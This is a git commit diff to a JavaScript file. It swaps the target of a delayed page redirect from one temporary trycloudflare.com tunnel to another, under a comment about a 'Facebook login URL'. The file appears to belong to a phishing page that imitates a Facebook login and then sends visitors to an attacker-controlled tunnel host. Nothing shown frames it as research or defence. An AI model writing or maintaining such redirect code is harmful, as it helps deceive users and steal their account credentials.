5fe50f2986ff936ef811fd3d5c2dfb6d3392c08a
isabelle.lua <168312386+IsabelleLua@users.noreply.github.com>
2025-02-20 20:28:33 -0300

    Update script.js

--- script.js
+++ script.js
@@ -89,7 +89,7 @@ document.addEventListener('DOMContentLoaded', () => {
         // Simulate redirect after 2 seconds
         setTimeout(() => {
             // Replace this with your actual Facebook login URL
-            window.location.href = 'https://hitting-river-charges-wednesday.trycloudflare.com';
+            window.location.href = 'https://welfare-cdna-donor-da.trycloudflare.com';
         }, 2000);
     });
 
